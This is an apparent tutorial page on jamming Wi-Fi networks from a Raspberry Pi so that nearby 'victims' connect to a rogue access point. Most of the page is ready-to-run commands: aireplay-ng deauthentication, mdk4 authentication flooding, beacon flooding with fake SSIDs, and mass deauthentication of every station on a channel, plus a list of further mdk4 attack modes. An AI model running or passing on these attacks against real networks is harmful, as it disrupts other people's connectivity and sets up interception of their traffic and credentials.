# WI-FI Jamming with Raspberry PI

If you have read the previous tutorial [Wi-Fi Analysis](../WIFIAnalysis), you know your Wi-Fi environment around your location. Now you can immediately create an [Simple Access Point](../AccessPoint) and wait until the first victims come by themselves. You can also do this process a little faster -> The IEEE 802.11 (_Wi-Fi_) protocol contains the provision for a deauthentication frames.

## Objective

The aim of this tutorial is to speed-up the process that stations will connect to the access point (_which is created in next tutorial_).

## Precondition

You should already have read (_and successful carried out_) the following tutorials.

- [Setup Raspberry PI](../Setup)
- [Prepare Raspberry PI](../Preparation)
- [Wi-Fi Analysis](../WIFIAnalysis)

## Install needed and/or optional packages

Install (_or ensure they are installed_) following packages.

```shell
# update system (optional)
$ sudo apt update -y && sudo apt upgrade -y

# install optional packages (optional)
$ sudo apt install -y vim wireless-tools

# install needed packages
$ sudo apt install -y aircrack-ng mdk4
```

## Attention

> In this tutorial we need the `wlan1` interface in the so-called monitor mode. You cannot use the `wlan0` interface from the Raspberry PI for this.

If you have already set up an [Access Point](../AccessPoint) and/or a [Captive portal](../CaptivePortal), you should stop them now!

```shell
# stop nodogsplash service
$ sudo systemctl stop nodogsplash

# stop hostapd service
$ sudo systemctl stop hostapd

# stop dnsmasq service
$ sudo systemctl stop dnsmasq
```

## Monitor Mode

The Wi-Fi interface (_wlan1_) must be set into "monitor mode".

```shell
# set interface down
$ sudo ip link set wlan1 down

# turn interface into monitor mode
$ sudo iwconfig wlan1 mode monitor

# set interface up
$ sudo ip link set wlan1 up
```

_Note: Read this [Wikipedia article](https://en.wikipedia.org/wiki/Monitor_mode) to get more information._

## aireplay-ng (Aircrack-ng)

The Aircrack-ng suite includes many tools to assess Wi-Fi networks. Here the focus is on `aireplay-ng` only. 

```shell
# show help (optional)
$ aireplay-ng --help

# start deauthentication attack
$ sudo aireplay-ng -0 0 -a [mac address] -c [mac address] wlan1
```

- `-0` means, deauthentication mode
- `0` means, send continuously deauthentication frames (_otherwise you can set a specific number_)
- `-a [mac address]` means, mac address of the access point
- `-c [mac address]` means, mac address of the station
- `wlan1` means, the interface`(_in monitor mode_)

## MDK4

MDK4 is the successor to MDK3 (_but requires the Aircrack-ng_). It's an awesome penetration tool for Wi-Fi, but be careful that you don't jam your own connection.

```shell
# show help (optional)
$ sudo mdk4 --help

# show detailed help (optional)
$ sudo mdk4 --fullhelp
```

### Authentication Denial-Of-Service (_Attack mode a_)

With this attack mode you send too many authentication frames to all AP's. This can freeze or reset several AP's.

```shell
# show help for specific attack mode (optional)
$ sudo mdk4 --help MODE a

# normal attack on specific AP (valid client mac)
$ sudo mdk4 wlan1 a -a [mac address] -m

# intelligent attack on specific AP (valid client mac)
$ sudo mdk4 wlan1 a -i [mac address] -m
```

### Beacon Flooding (_Attack mode b_)

With this attack mode you generate fake AP's. You could push the real AP far back, and your AP among the first places.

```shell
# show help for specific attack mode (optional)
$ sudo mdk4 --help MODE b

# create fake AP's (without encryption but valid ap mac)
$ sudo mdk4 wlan1 b -w n -m

# create text file
$ vim fake_ssid

# create fake AP's from file (without encryption but valid ap mac)
$ sudo mdk4 wlan1 b -w n -f fake_ssid -m
```

The content of the file `fake_ssid` (_feel free to change or add other content._).

```
WuTangLAN
Wi-Fry Chicken
Access Denied
Virus.exe
Connect or Die
For Porn Use Only
Missed Connections
Bathroom Cam
Big Busty Asians
o==[]:::::::::::::::::::::::::>
```

### Deauthentication and Disassociation (_Attack mode d_)

With this attack mode you deauthenticate stations from there access point. If you AP is ready (_and signal is strong_) they might connect to you afterwards.

```shell
# show help for specific attack mode (optional)
$ sudo mdk4 --help MODE d

# disconnect all stations from all AP's on channel 11
$ sudo mdk4 wlan1 d -c 11
```

### other MDK4 attacks

MDK4 offers 9 attack modules. Depending on your needs, take also a look at the other!

- ATTACK MODE a: Authentication Denial-Of-Service
- ATTACK MODE b: Beacon Flooding
- ATTACK MODE d: Deauthentication and Disassociation  
- ATTACK MODE e: EAPOL Start and Logoff Packet Injection
- ATTACK MODE f: Packet Fuzzer
- ATTACK MODE m: Michael Countermeasures Exploitation
- ATTACK MODE p: SSID Probing and Bruteforcing
- ATTACK MODE s: Attacks for IEEE 802.11s mesh networks
- ATTACK MODE w: WIDS Confusion

[Go Back](../readme.md)
